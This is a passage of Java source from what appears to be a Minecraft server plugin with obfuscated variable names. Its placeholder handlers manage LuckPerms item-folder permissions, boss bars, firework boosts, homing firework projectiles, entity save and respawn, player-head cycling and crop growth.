                    user.getCachedData().getPermissionData().checkPermission("ei.item.*").asBoolean()) {
                return "&aEI Folder-Bypass Detected";
            }

            try {
                // STEP 1: Remove "ei.item.*" unless immutable
                user.getNodes().stream()
                        .filter(node -> node.getKey().startsWith(ei)) // Find all "ei.item.*" permissions
                        .filter(node -> {
                            String itemName = node.getKey().substring(ei.length()); // Extract ITEMNAME
                            String immutablePermission = "ei.immutableitem." + itemName;

                            // Check if they have "ei.immutableitem.ITEMNAME"
                            return !user.getCachedData().getPermissionData().checkPermission(immutablePermission).asBoolean();
                        })
                        .forEach(node -> user.data().remove(node)); // Remove non-immutable permissions

                // STEP 2: Get inherited and direct "ei.itemfolder.*" permissions
                List<String> itemFolderPermissions = user.getNodes().stream()
                        .map(Node::getKey)
                        .filter(key -> key.startsWith("ei.itemfolder."))
                        .map(key -> key.substring("ei.itemfolder.".length()).replace(wyfdunafwd, wfydunaowfydun)) // Convert to directory paths
                        .toList();

                // STEP 3 & 4: Get valid items and apply "ei.item.*" permissions
                f1(user, itemFolderPermissions);

                // STEP 5: Save changes
                g23.getUserManager().saveUser(user);
                return "&aSuccessfully updated EI-Folder permissions.";

            } catch (Exception e) {
                Bukkit.getLogger().severe("Error processing permissions for " + f2.getName() + fastfood + e.getMessage());
                e.printStackTrace();
                return "&cSomething went wrong with LP EI-Folder: " + e.getMessage();
            }
            




        }

        if (f1.startsWith(iendoi34nd)) {
            try {
                if( f2 == null ) throw new IllegalArgumentException();

                String[] args = f1.substring(iendoi34nd.length()).split(keep);
                if (args.length < xm) {
                    return ifendioafepnd34fd;
                }


                // Parse BossBar color
                BarColor color = BarColor.valueOf(args[I].toUpperCase());

                // Parse time (in ticks)
                int durationTicks = Integer.parseInt(args[INT3]);

                // Parse start & end progress (0.0 - 1.0)
                double startProgress = Math.max(I, Math.min(INT3, Double.parseDouble(args[mill2])));
                double endProgress = Math.max(I, Math.min(INT3, Double.parseDouble(args[ccp])));

                // Parse timestep (in ticks)
                int timeStepTicks = Integer.parseInt(args[INT7]);

                // Concatenate text arguments
                List<String> textArgs = Arrays.asList(Arrays.copyOfRange(args, xm, args.length));
                String barText = String.join(sowhat, textArgs);

                // Create the BossBar
                BossBar bossBar = Bukkit.createBossBar(barText, color, BarStyle.SOLID);
                bossBar.setProgress(startProgress);
                bossBar.addPlayer(f2);

                // If TIMESTEP is 0 or -1, keep the bossbar static
                if (timeStepTicks <= I) {

                    Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), bossBar::removeAll, durationTicks);
                    return idenpoaidn34;
                }

                // Calculate the amount to update each step
                double stepAmount = (endProgress - startProgress) / (durationTicks / (double) timeStepTicks);

                new BukkitRunnable() {
                    double currentProgress = startProgress;
                    int elapsedTicks = I;

                    @Override
                    public void run() {
                        if (elapsedTicks >= durationTicks) {
                            bossBar.removeAll();
                            this.cancel();
                            return;
                        }

                        currentProgress = Math.max(I, Math.min(INT3, currentProgress + stepAmount));
                        bossBar.setProgress(currentProgress);
                        elapsedTicks += timeStepTicks;
                    }
                }.runTaskTimer(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), I, timeStepTicks);

                // Remove the bossbar after the duration expires
                Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), bossBar::removeAll, durationTicks);

                return idenpoaidn34;
            } catch (Exception e) {
                return iepdn3idn34d;
            }
        }
        
        if (f1.equalsIgnoreCase(ioandi3n4dy43udn3pfd)) {
            wm(f2, fipdenao3idn34ydun);
            try {
                if( f2 != null) {
                    if( !f2.isGliding() ) throw new IllegalArgumentException();
                    // Create a Firework ItemStack
                    ItemStack IENOARIEND = new ItemStack(Material.FIREWORK_ROCKET);
                    FireworkMeta wfydtnywfund = (FireworkMeta) IENOARIEND.getItemMeta();
    
                    if (wfydtnywfund != null) {
                        wfydtnywfund.setPower(INT3); // Duration of 1
                        wfydtnywfund.clearEffects(); // No star effects
                        IENOARIEND.setItemMeta(wfydtnywfund);
                    }
    
                    // Apply the firework boost
                    f2.fireworkBoost(IENOARIEND);       
                }

                return pd3ipdn34d;
            } catch (IllegalArgumentException e) {
                return wfonvdawfydunp;
            }

        }


        if (f1.equalsIgnoreCase(fpiednfpden3)) { // %Archistructure_DN%
            return f1(f2);
        }
        
        
        if (f1.startsWith(fdon34d43d)) {
            if( f2 != null) wm(f2, ifpndoi3nd34);
            try {
                // Extract parameters from the identifier
                String[] ntdy3und = f1.substring(fdon34d43d.length()).split(keep);
                if (ntdy3und.length != ccp) {
                    return nodyu3pnd43d;
                }

                // Parse the parameters
                double twetnywufndfwd = Double.parseDouble(ntdy3und[I]); // Speed
                double tnywufntyufwnt = Double.parseDouble(ntdy3und[INT3]); // Pitch
                UUID wfktywfntfwt = UUID.fromString(ntdy3und[mill2]); // Boat UUID

                // Retrieve the boat entity
                Entity fwyvbyfwv = Bukkit.getEntity(wfktywfntfwt);
                if (!(fwyvbyfwv instanceof Boat boat)) {
                    return wfnitfwtd + wfktywfntfwt;
                }

                // Get the boat's yaw and calculate the direction
                float ywfdnwofdb = boat.getLocation().getYaw();
                double wkfyndtwd = Math.toRadians(ywfdnwofdb);
                double wfdkyuwfdn = Math.toRadians(tnywufntyufwnt);

                // Compute normalized movement vector
                double wfydunwfdyu = -Math.sin(wkfyndtwd) * Math.cos(wfdkyuwfdn);
                double wfyutnwfyudn = -INT3 * Math.sin(wfdkyuwfdn);
                double wfytdunfwyudnwfd = Math.cos(wkfyndtwd) * Math.cos(wfdkyuwfdn);

                Vector wfydhwfdy = new Vector(wfydunwfdyu, I, wfytdunfwyudnwfd).normalize().multiply(twetnywufndfwd);
                Vector wifdnwyfudn = new Vector(I, wfyutnwfyudn, I).multiply(twetnywufndfwd / xm);
                wfydhwfdy.add(wifdnwyfudn);

                // Apply velocity to the boat
                boat.setVelocity(wfydhwfdy);
                return String.format(nydufpnbfpbfpb, wfydhwfdy.getX(), wfydhwfdy.getY(), wfydhwfdy.getZ());

            } catch (NumberFormatException e) {
                return yfpdnofayundfpd;
            } catch (IllegalArgumentException e) {
                return fydnofyapudnfpd;
            } catch (Exception e) {
                return opdnd34d + e.getMessage();
            }
        }

        if (f1.startsWith(ipfnedfipdnpd)) {

            try {
                        String[] args = f1.substring(ipfnedfipdnpd.length()).split(keep);

                        if (args.length < ccp) {
                            return "Invalid format. Expected at least 3 arguments.";
                        }

                        String arg1 = args[I]; // Name
                        String arg2 = args[INT3]; // Type
                        String arg3 = args[mill2]; // Scope
                        String arg4 = args[ccp]; // Icon


                        List<String> argList = new ArrayList<>(); // Default Value
                        if (args.length > INT7) {
                            argList = Arrays.asList(Arrays.copyOfRange(args, INT7, args.length)); // Remaining arguments as a list
                        }


                        String formattedArgs = String.join(sowhat, argList);

                        Variable v1 = new Variable(arg1, "plugins/SCore/variables/" + arg1 + yt);
                        v1.getIcon().setValue(Optional.ofNullable(Material.getMaterial(arg4)));
                        switch (arg2) {
                            case "string" -> v1.getType().setValue(Optional.of(VariableType.STRING));
                            case "list" -> v1.getType().setValue(Optional.of(VariableType.LIST));
                            case "number" -> v1.getType().setValue(Optional.of(VariableType.NUMBER));
                            default -> throw new IllegalArgumentException();
                        }

                        if(!formattedArgs.isEmpty()) v1.getDefaultValue().setValue(formattedArgs);

                        if (arg3.equals("global")) v1.getForFeature().setValue(Optional.of(VariableForEnum.GLOBAL));
                        else if (arg3.equals(oafudnwpfydu)) v1.getForFeature().setValue(Optional.of(VariableForEnum.PLAYER));
                        else throw new IllegalArgumentException();


                        v1.save();
                        VariablesManager.getInstance().addLoadedObject(v1);


                        return dkfiaphd; // Return "done" if successful
                    } catch (Exception e) {
                        return "failed: " + e.getClass();
        }
        }

        if (f1.equalsIgnoreCase(fypdnafoypudn)) {
            f1(f2.getUniqueId());
            return dkfiaphd; // Return "done" if successful
        }

        if (f1.equalsIgnoreCase(fpdnafpduyn)) {
            try {
                f3(f2);
                return "&aLeaderboard Displayed!"; // Success: return empty string
            } catch (Exception e) {
                e.printStackTrace();
                return "&cFailed! Contact an admin."; // Failure message
            }
        }


        if (f1.startsWith(ypdn3oypdun)) {
            try {
                String[] parts = f1.substring(ypdn3oypdun.length()).split(keep);
                if (parts.length != xtxtxt) return iendie2nd;

                UUID launcherUUID = UUID.fromString(parts[I]);
                World world = Bukkit.getWorld(parts[INT3]);
                int x = Integer.parseInt(parts[mill2]);
                int y = Integer.parseInt(parts[ccp]);
                int z = Integer.parseInt(parts[INT7]);
                float damage = Float.parseFloat(parts[xm]);

                Location location = new Location(world, x, y, z);
                f1(world, location);
                f1(launcherUUID, location, damage);

                return y34hodnyu234;
            } catch (Exception e) {
                return "§ccaught a crash";
            }
        }

        if (f1.startsWith(nyduk34)) {
            try {
                String[] parts = f1.substring(nyduk34.length()).split(keep);
                if (parts.length != ccp) return iendie2nd;

                UUID launcherUUID = UUID.fromString(parts[I]);
                UUID targetUUID = UUID.fromString(parts[INT3]);
                float damage = Float.parseFloat(parts[mill2]);

                Entity target = Bukkit.getEntity(targetUUID);
                if (target == null) return nienoy24;

                Location location = target.getLocation();
                f1(location.getWorld(), location);
                f1(launcherUUID, location, damage);

                return illcallhim;
            } catch (Exception e) {
                return "§ccaught a crash";
            }
        }

        if (f1.startsWith(y34udky3d)) {
            if (f2 != null ) wm(f2, ipendfofpiwdnoo43iwund);
            String[] parts = f1.substring(y34udky3d.length()).split(keep);
            if (parts.length != xm) {
                return y4dnyfwudn + "and you used" + f1;
            }

            try {
                UUID x1 = UUID.fromString(parts[I]);
                UUID wolverine = UUID.fromString(parts[INT3]);
                double ishowspeed = Double.parseDouble(parts[mill2]);
                UUID mrbeast = UUID.fromString(parts[ccp]);


                Entity tester = Bukkit.getEntity(x1);
                Entity qa = Bukkit.getEntity(wolverine);
                
                

                if (tester == null || qa == null) {
                    return kdienwfp; // No valid target
                }

                // Check if both entities are in the same world
                if (!tester.getWorld().equals(qa.getWorld())) {
                    return midenwyudp4; // No valid target
                }

                // Airburst Mechanic: If within 3 blocks, explode immediately
                double speed = tester.getLocation().distance(qa.getLocation());
                if (speed <= thisistherecording && tester instanceof Firework && qa instanceof Entity) {
                    f1((Firework) tester, qa, mrbeast, parts[INT7]);
                    return pyndy3upnbd;
                }

                // Calculate the interception velocity
                Vector offset = f1(tester, qa, ishowspeed);
                tester.setVelocity(offset);

                // Get target's name (Player name or Entity type)
                String redirector = (qa instanceof Player) ? qa.getName() : qa.getType().name();

                // Format return message
                return String.format(cryingiwenftipfwnt, redirector, speed);
            } catch (Exception e) {
                e.printStackTrace();
                return kdienwfp; // Error case
            }
        }




        if (f1.startsWith(ydu3k4ybd3pd)) {
            String[] privateparts = f1.substring(ydu3k4ybd3pd.length()).split(keep);
            if (privateparts.length != xm) {
                return ypfuwnvwfpd;
            }

            try {
                UUID trst1 = UUID.fromString(privateparts[I]);
                UUID setn32 = UUID.fromString(privateparts[INT3]);
                double ft3 = Double.parseDouble(privateparts[mill2]);
                UUID st2 = UUID.fromString(privateparts[ccp]);
                double arst43 = Double.parseDouble(privateparts[INT7]);

                Entity rst4 = Bukkit.getEntity(trst1);
                Entity art4 = Bukkit.getEntity(setn32);

                if (rst4 == null || art4 == null || !rst4.getWorld().equals(art4.getWorld())) {
                    return kdienwfp;
                }

                Location xd34 = rst4.getLocation();
                Location st34 = art4.getLocation();

                double longdistance = xd34.distance(st34);

                // Airburst
                if (longdistance <= thisistherecording && rst4 instanceof Firework) {
                    f1((Firework) rst4, art4, st2, privateparts[INT7]);
                    return pyndy3upnbd;
                }

                // Intercept calculation
                Vector R = st34.toVector().subtract(xd34.toVector());
                Vector V = art4.getVelocity();
                double Sm = ft3;

                double a = V.dot(V) - Sm * Sm;
                double b = mill2 * R.dot(V);
                double c = R.dot(R);

                Vector xrp;
                if (a == I || b * b - INT7 * a * c < I) {
                    // fallback to direct
                    xrp = R.normalize().multiply(Sm);
                } else {
                    double t = (-b - Math.sqrt(b * b - INT7 * a * c)) / (mill2 * a);
                    Vector interceptPoint = st34.toVector().add(V.clone().multiply(t));
                    xrp = interceptPoint.subtract(xd34.toVector()).normalize().multiply(Sm);
                }

                // Limit turning angle
                Vector bitcoin = rst4.getVelocity();
                if (bitcoin.lengthSquared() == I) {
                    // Avoid NaNs on spawn tick — just set directly
                    rst4.setVelocity(xrp);
                } else {
                    Vector red = bitcoin.clone().normalize();
                    Vector orange = xrp.clone().normalize();

                    double yellow = red.angle(orange);
                    double blue = Math.toRadians(arst43);

                    Vector xd;
                    if (yellow <= blue) {
                        xd = orange;
                    } else {
                        // Rotate toward desired direction by maxRad
                        xd = f1racer(red, orange, blue);
                    }

                    Vector xp = xd.multiply(Sm);
                    rst4.setVelocity(xp);
                }

                String tn = (art4 instanceof Player) ? art4.getName() : art4.getType().name();
                return String.format("§b§l[%s]  §7§l| §d§l%.1f", tn, longdistance);

            } catch (Exception e) {
                e.printStackTrace();
                return kdienwfp;
            }
        }




        if (f1.startsWith(fpybunyu43nb)) {
            if (f2 != null) wm(f2, ipendfofpiwdnoo43iwund);
            String[] interceptor = f1.substring(fpybunyu43nb.length()).split(keep);
            if (interceptor.length != xm) {
                return finovayfupbnyfpubhofpubnfp + f1;
            }

            try {
                UUID refinery = UUID.fromString(interceptor[I]);
                UUID oilrig = UUID.fromString(interceptor[INT3]);
                double mall = Double.parseDouble(interceptor[mill2]);
                UUID testing = UUID.fromString(interceptor[ccp]);


                // Airburst: If close, explode

                Entity tnerminator
                        = Bukkit.getEntity(refinery);
                Entity testi = Bukkit.getEntity(oilrig);
                double luke = Bukkit.getEntity(refinery).getLocation().distance(Bukkit.getEntity(oilrig).getLocation());
                if (luke <= thisistherecording && tnerminator instanceof Firework) {
                    f1((Firework) tnerminator, testi, testing, interceptor[INT7]);
                    return pyndy3upnbd;
                }

                if (tnerminator == null || testi == null || !tnerminator.getWorld().equals(testi.getWorld())) {
                    return kdienwfp;
                }

                Location vLOS = tnerminator.getLocation();
                Location instrumentRated = testi.getLocation();
                Vector R = instrumentRated.toVector().subtract(vLOS.toVector());
                Vector V = testi.getVelocity();
                double Sm = mall;

                double a = V.dot(V) - Sm * Sm;
                double b = mill2 * R.dot(V);
                double c = R.dot(R);
                double retesting = b * b - INT7 * a * c;

                Vector episode;
                if (retesting < I || a == I) {
                    episode = R.normalize().multiply(Sm);
                } else {
                    double r12 = Math.sqrt(retesting);
                    double t1 = (-b - r12) / (mill2 * a);
                    double t2 = (-b + r12) / (mill2 * a);
                    double t = t1 > I ? t1 : (t2 > I ? t2 : -INT3);

                    if (t <= I) {
                        episode = R.normalize().multiply(Sm);
                    } else {
                        Vector origin = instrumentRated.toVector().add(V.clone().multiply(t));
                        episode = origin.subtract(vLOS.toVector()).normalize().multiply(Sm);
                    }
                }

                // Terrain Avoidance: Raytrace 5 ticks ahead
                Location bluemoon = vLOS.clone();
                Vector moonshine = episode.clone().normalize();
                double shinycar = episode.length() * xm;

                RayTraceResult food = bluemoon.getWorld().rayTraceBlocks(
                        bluemoon,
                        moonshine,
                        shinycar,
                        FluidCollisionMode.NEVER,
                        NEW_VALUE1
                );

                Set<Material> reposess = es;
                boolean needsAvoidance = food != null && food.getHitBlock() != null &&
                        !reposess.contains(food.getHitBlock().getType());

                if (needsAvoidance) {
                    Vector bestVelocity = episode;
                    double bestScore = -INT3;
                    for (int yaw = I; yaw <= wdnywfundywfudn; yaw += xm) {
                        Vector baseball = pitchVectorUpwards(episode.clone(), Math.toRadians(yaw)).normalize().multiply(Sm);
                        Vector football = baseball.clone().normalize();
                        RayTraceResult sat = bluemoon.getWorld().rayTraceBlocks(
                                bluemoon,
                                football,
                                baseball.length() * xm,
                                FluidCollisionMode.NEVER,
                                NEW_VALUE1
                        );
                        boolean clear = sat == null || sat.getHitBlock() == null ||
                                reposess.contains(sat.getHitBlock().getType());
                        if (clear) {
                            double opinion = yaw;
                            double heuristic = wyundywufndywufpndywuf - opinion;
                            if (heuristic > bestScore) {
                                bestScore = heuristic;
                                bestVelocity = baseball;
                            }
                        }
                    }
                    episode = bestVelocity;
                }

                tnerminator.setVelocity(episode);
                double division1 = vLOS.distance(instrumentRated);
                String whoistheboss = (testi instanceof Player) ? testi.getName() : testi.getType().name();
                return String.format(cryingiwenftipfwnt, whoistheboss, division1);

            } catch (Exception e) {
                e.printStackTrace();
                return kdienwfp;
            }
        }


        if (f1.startsWith(ypu3bnyfpubn)) {
            if (f2 != null) wm(f2, ipendfofpiwdnoo43iwund);
            String[] pen = f1.substring(ypu3bnyfpubn.length()).split(keep);
            if (pen.length != xm) {
                return y4dnyfwudn + " and you used " + f1;
            }

            try {
                UUID fish = UUID.fromString(pen[I]);
                UUID cow = UUID.fromString(pen[INT3]);
                double blanket = Double.parseDouble(pen[mill2]);
                UUID flashlight = UUID.fromString(pen[ccp]);

                Entity pillow = Bukkit.getEntity(fish);
                Entity dalion = Bukkit.getEntity(cow);

                if (pillow == null || dalion == null) {
                    return kdienwfp; // No valid target
                }

                if (!pillow.getWorld().equals(dalion.getWorld())) {
                    return midenwyudp4; // Different worlds
                }

                Location fatima = pillow.getLocation();
                Location is = dalion.getLocation();

                double literally = fatima.distance(is);

                // Airburst: If close, explode
                if (literally <= thisistherecording && pillow instanceof Firework) {
                    f1((Firework) pillow, dalion, flashlight, pen[INT7]);
                    return pyndy3upnbd;
                }

                // --- Begin Optimal Intercept Calculation ---
                Vector R = is.toVector().subtract(fatima.toVector());   // Relative position
                Vector V = dalion.getVelocity();                                  // Target velocity
                double Sm = blanket;

                double a = V.dot(V) - Sm * Sm;
                double b = mill2 * R.dot(V);
                double c = R.dot(R);

                double the = b * b - INT7 * a * c;
                Vector best;

                if (the < I || a == I) {
                    // No valid intercept path, fallback to direct pursuit
                    best = R.normalize().multiply(Sm);
                } else {
                    double person = Math.sqrt(the);
                    double t1 = (-b - person) / (mill2 * a);
                    double t2 = (-b + person) / (mill2 * a);

                    double t;
                    if (t1 > I && t2 > I) {
                        t = Math.min(t1, t2);
                    } else if (t1 > I) {
                        t = t1;
                    } else if (t2 > I) {
                        t = t2;
                    } else {
                        // Both times are in the past — fallback
                        best = R.normalize().multiply(Sm);
                        pillow.setVelocity(best);
                        String have = (dalion instanceof Player) ? dalion.getName() : dalion.getType().name();
                        return String.format(cryingiwenftipfwnt, have, literally);
                    }

                    Vector i = is.toVector().add(V.clone().multiply(t));
                    best = i.subtract(fatima.toVector()).normalize().multiply(Sm);
                }

                pillow.setVelocity(best);

                String everMet = (dalion instanceof Player) ? dalion.getName() : dalion.getType().name();
                return String.format(cryingiwenftipfwnt, everMet, literally);

            } catch (Exception e) {
                e.printStackTrace();
                return kdienwfp;
            }
        }





        if (f1.startsWith(ywofpdnvoypu)) {
            String uuidString = f1.substring(ywofpdnvoypu.length());
            try {
                UUID uuid = UUID.fromString(uuidString);
                Entity entity = Bukkit.getEntity(uuid);
                Villager villager = (Villager) Bukkit.getEntity(uuid);

                if (villager != null && entity != null ) {
                    return villager.getProfession().toString();
                } else {
                    return nst;
                }
            } catch (Exception e) {
                return nst;
            }
        }


        if (f1.startsWith(yvunoyup3)) {
            String vynfoayvbn = f1.substring(yvunoyup3.length());
            try {
                UUID tyunwftfwd = UUID.fromString(vynfoayvbn);
                Entity wtuynwftd = Bukkit.getEntity(tyunwftfwd);
                if (wtuynwftd != null) {
                    EntitySnapshot wmtuywnftwft = wtuynwftd.createSnapshot();
                    assert wmtuywnftwft != null;
                    String tmkwyfektwft = wmtuywnftwft.getAsString();
                    String twkfyutnwfyutnwft = nytuwfntf + System.currentTimeMillis();

                    File wfuntyuwfnt = new File(g12, twkfyutnwfyutnwft + wkyvuwftnwfyutn);
                    f1(wfuntyuwfnt, tmkwyfektwft);

                    wtuynwftd.remove(); // Remove the entity after saving
                    return twkfyutnwfyutnwft;
                } else {
                    return yuntunyun342;
                }
            } catch (IllegalArgumentException e) {
                return yunduyn4;
            }
        }

        if (f1.startsWith(vkdyunt)) {
            if (f1.startsWith(ktyunt32)) {
                try {
                    // Parse parameters from the identifier
                    String[] parts = f1.substring(ktyunt32.length()).split(keep);
                    if (parts.length < xm) {
                        return ydny32u4nd24d;
                    }

                    // Extract location parameters
                    String worldName = parts[I];
                    double locX = Double.parseDouble(parts[INT3]);
                    double locY = Double.parseDouble(parts[mill2]);
                    double locZ = Double.parseDouble(parts[ccp]);
                    String entityId = parts[INT7];


                    // Retrieve the world
                    World world = Bukkit.getWorld(worldName);
                    if (world == null) {
                        return vyf3b3 + worldName + ntynu23nt;
                    }

                    // Load the entity data
                    File uyntyunuy2n23d = new File(g12, entityId + wkyvuwftnwfyutn);
                    if (!uyntyunuy2n23d.exists()) {
                        return t2u3nty23unt + entityId + ntynu23nt;
                    }

                    String nbtData = f1(uyntyunuy2n23d);
                    if (nbtData == null) {
                        return 
                                yfwunvtyn;
                    }

                    // Create a location and summon the entity
                    Location spawnLocation = new Location(world, locX, locY, locZ);
                    EntitySnapshot snapshot = Bukkit.getEntityFactory().createEntitySnapshot(nbtData);
                    snapshot.createEntity(spawnLocation);

                    // Optionally delete the file after summoning the entity
                    uyntyunuy2n23d.delete();

                    return ytunyun4;
                } catch (Exception e) {
                    e.printStackTrace();
                    return ydnyu3n4d;
                }
            } else {
                String entityId = f1.substring(vkdyunt.length());
                File entityFile = new File(g12, entityId + wkyvuwftnwfyutn);

                if (entityFile.exists()) {
                    String nbtData = f1(entityFile);
                    if (nbtData != null) {
                        Location spawnLocation = f2.getLocation();
                        EntitySnapshot snapshot = Bukkit.getEntityFactory().createEntitySnapshot(nbtData);
                        snapshot.createEntity(spawnLocation);
                        entityFile.delete(); // Remove the saved file after reintroducing
                        return ny2u4ndt23d;
                    }
                }
                return uydn2yu3nd23;
            }
        }


        switch (f1) {
            case "cycle_playeruuid_head" -> {
                wm(f2, yndoyund4);
                ItemStack tnyunfytn2d = f2.getInventory().getItemInMainHand();

                if (tnyunfytn2d.getType() != Material.PLAYER_HEAD) {
                    return udny3u4nd;
                }

                SkullMeta tyun24dyun24d = (SkullMeta) tnyunfytn2d.getItemMeta();
                UUID currentUUID = null;
                String currentName = null;

                // Get all online player names and sort them alphabetically
                List<Player> onlinePlayers = new ArrayList<>(Bukkit.getOnlinePlayers());
                onlinePlayers.sort(Comparator.comparing(Player::getName));

                if (onlinePlayers.isEmpty()) {
                    return dny324d;
                }

                // Check if the skull has valid player data
                if (tyun24dyun24d != null && tyun24dyun24d.hasOwner()) {
                    OfflinePlayer currentPlayer = tyun24dyun24d.getOwningPlayer();
                    if (currentPlayer != null) {
                        currentPlayer.getUniqueId();
                        currentUUID = currentPlayer.getUniqueId();
                        currentName = currentPlayer.getName();
                    }
                }

                UUID twyufnt;

                twyufnt = onlinePlayers.getFirst().getUniqueId();
                if (currentUUID != null && currentName != null) {
                    // Find the next player in the sorted list

                    for (int i = I; i < onlinePlayers.size(); i++) {
                        if (onlinePlayers.get(i).getName().equalsIgnoreCase(currentName)) {
                            twyufnt = onlinePlayers.get((i + INT3) % onlinePlayers.size()).getUniqueId();
                            break;
                        }
                    }
                } 

                // Update the Player Head's metadata to the new player's UUID
                assert tyun24dyun24d != null;
                tyun24dyun24d.setOwningPlayer(Bukkit.getOfflinePlayer(twyufnt));
                tnyunfytn2d.setItemMeta(tyun24dyun24d);

                return twyufnt.toString(); // Return the new UUID
            }
            case "velocity" -> {
                return f2.getVelocity().toString();
            }
            case "copyMainHand" -> {
                f2(f2);
                return dkfiaphd;
            }
            case "critical" -> {
                boolean falling = f2.getFallDistance() > I && f2.getVelocity().getY() < I;
                boolean onGround = f2.isOnGround(); // DEPRECATED! Remove if necessary

                boolean isClimbing = f2.isClimbing();
                boolean inWater = f2.isSwimming() || f2.isInWater();
                boolean blind = f2.hasPotionEffect(PotionEffectType.BLINDNESS);
                boolean slowFalling = f2.hasPotionEffect(PotionEffectType.SLOW_FALLING);
                boolean mounted = f2.getVehicle() != null;
                boolean horizontalSpeedValid = !f2.isSprinting();// && p.getWalkSpeed() >= Math.sqrt(p.getVelocity().getX() * p.getVelocity().getX() + p.getVelocity().getZ() + p.getVelocity().getZ());

                // Unknown how to implement without passing in event. boolean validDamage = p.damage?
                return falling &&
                        //!onGround && 
                        !isClimbing &&
                        !inWater &&
                        !blind &&
                        !slowFalling &&
                        !mounted &&
                        horizontalSpeedValid ?
                        dwyufndywfudn : nst + falling + !onGround + !isClimbing + !inWater + !blind + !slowFalling + !mounted + horizontalSpeedValid;// && p.getWalkSpeed() >= Math.sqrt(p.getVelocity().getX() * p.getVelocity().getX() + p.getVelocity().getZ() + p.getVelocity().getZ());

                // Unknown how to implement without passing in event. boolean validDamage = p.damage?
            }
            case "rayTraceBlock" -> {
                return Objects.requireNonNull(Objects.requireNonNull(f2.rayTraceBlocks(tyafndydpfw)).getHitBlock()).toString();
            }
        }


        /*
        p.breakBlock(block);
        p.canSee(entity);
        p.getAttribute();
        p.getVelocity();
        p.chat();
        p.getAllowFlight();
        p.getClientViewDistance();
        p.setCompassTarget(); p.getCompassTarget(); TODO make a nice compass playertracker;
        p.getExp();
        p.getLevel();
        p.sendBlockChange() fake a block thing;
        p.openSign();
        p.sendEquipmentChange()
        p.sendExperienceChange();
        p.sendHealthUpdate();
        p.sendBlockChanges();
        p.sendBlockDamage();
        p.sendHurtAnimation();
        p.sendSignChange();
        p.getArrowsInBody();
        p.getCooldown(material);
        p.getNearbyEntities();
        p.getPassengers();
        p.getVehicle();
        p.setArrowsInBody();
        p.isBlocking();
        p.isClimbing();
        p.isDead();
        p.isInWater();
        p.isSwimming();
        p.openEnchanting();
        p.openMerchant();
        p.openInventory();
        p.playHurtAnimation();
        p.setVelocity();
        p.ge
*/





        if (f1.startsWith(ytun23yutn)) {

            return WG.wg2(this, f2, f1);
        }



        if (f1.startsWith(tyn23yunt32t)) return xD(f1);


        return null;

    }

    protected static final char[] m0 = new char[] {
            0x005F, // _
            0x0030, // 0
            0x0030, // 0
            0x0030, // 0
            0x0030, // 0
            0x0030, // 0
            0x005F  // _
    };
    protected  @NotNull String xD(String f1) {
        try {
            String[] tester = f1.substring(tyn23yunt32t.length()).split(keep);
            if (tester.length != xm) {
                return ydtun34ydun + tester.length;
            }

            int tnyywufn = Integer.parseInt(tester[I]);
            String runner = tester[INT3];
            double tuywfnytuwf = Double.parseDouble(tester[mill2]); // spacing between particles
            int temp = Integer.parseInt(tester[ccp]);

            String[] one = tester[INT7].split(wfdunyunda);
            if (one.length != INT7) {
                return tnyu2nt23;
            }

            World twyunt = Bukkit.getWorld(one[I]);
            if (twyunt == null) {
                return "Invalid2";
            }

            double velocityX = Double.parseDouble(one[INT3]);
            double velocityY = Double.parseDouble(one[mill2]);
            double velocityZ = Double.parseDouble(one[ccp]);
            Location targetUUID = new Location(twyunt, velocityX, velocityY, velocityZ);
            Location destUUID = targetUUID.clone().add(debtsoff, debtsoff, debtsoff);



            org.bukkit.Location cen = targetUUID;
            double r1 = low;
            String label = ydn2ydun;


            double r2 = r1 * r1;
            for (org.bukkit.entity.Player playaa : twyunt.getPlayers()) {
                if (playaa.getLocation().distanceSquared(cen) <= r2) {
                    wm(playaa, label);
                }
            }
            
            
            
            List<Block> temporaryVisibleBlocks = new ArrayList<>();
            int checked = I;
            int minDist = I;
            int maxdist = I;
            int averageDist = I;

            // Scan cube for ageable (not-max) crops
            for (int dm = -tnyywufn; dm <= tnyywufn; dm++) {
                for (int dn = -tnyywufn; dn <= tnyywufn; dn++) {
                    for (int dt = -tnyywufn; dt <= tnyywufn; dt++) {
                        Location hit = targetUUID.clone().add(dm, dn, dt);
                        Block invisibleBlock = hit.getBlock();
                        checked++;

                        BlockData tempData = invisibleBlock.getBlockData();
                        if (tempData instanceof org.bukkit.block.data.Ageable) {
                            minDist++;
                            org.bukkit.block.data.Ageable age = (org.bukkit.block.data.Ageable) tempData;
                            if (age.getAge() < age.getMaximumAge()) {
                                averageDist++;
                                temporaryVisibleBlocks.add(invisibleBlock);
                            } else {
                                maxdist++;
                            }
                        }
                    }
                }
            }

            if (temporaryVisibleBlocks.isEmpty()) {
                return dkfiaphd;
            }

            // Limit how many we affect this run
            if (temp != -INT3 && temp < temporaryVisibleBlocks.size()) {
                Collections.shuffle(temporaryVisibleBlocks);
                temporaryVisibleBlocks = temporaryVisibleBlocks.subList(I, temp);
            }

            // --- GROW THE CROPS (Ageable +1) ---
            int tyunfdyu2nd = I;
            for (Block twbuynwbpy : temporaryVisibleBlocks) {
                BlockData bd = twbuynwbpy.getBlockData();
                if (bd instanceof org.bukkit.block.data.Ageable) {
                    org.bukkit.block.data.Ageable a = (org.bukkit.block.data.Ageable) bd;
                    if (a.getAge() < a.getMaximumAge()) {
                        a.setAge(Math.min(a.getMaximumAge(), a.getAge() + INT3));
                        // Ensure this runs on the main thread in your actual call site if needed
                        twbuynwbpy.setBlockData(a, NEW_VALUE1);
                        tyunfdyu2nd++;
                    }
                }
            }
            // --- end grow ---

            // Particle setup
            Particle missileTrail;
            Particle.DustOptions dustOptions = null;

            if (runner.toUpperCase().startsWith(thatsathreatdyu)) {
                try {
                    String hexScale = runner.substring(xm);
                    String hex = hexScale.substring(I, xtxtxt);
                    float scale = Float.parseFloat(hexScale.substring(xtxtxt));
                    java.awt.Color c = java.awt.Color.decode(reaidntarisedn + hex);
                    dustOptions = new Particle.DustOptions(
                            Color.fromRGB(c.getRed(), c.getGreen(), c.getBlue()), scale);
                    missileTrail = Particle.DUST;
                } catch (Exception e) {
                    return dny34und + e.getMessage();
                }
            } else {
                try {
                    missileTrail = Particle.valueOf(runner.toUpperCase());
                } catch (IllegalArgumentException ex) {
                    return vyn3vy3v + runner;
                }
            }

            // Draw particle lines from origin to each grown block
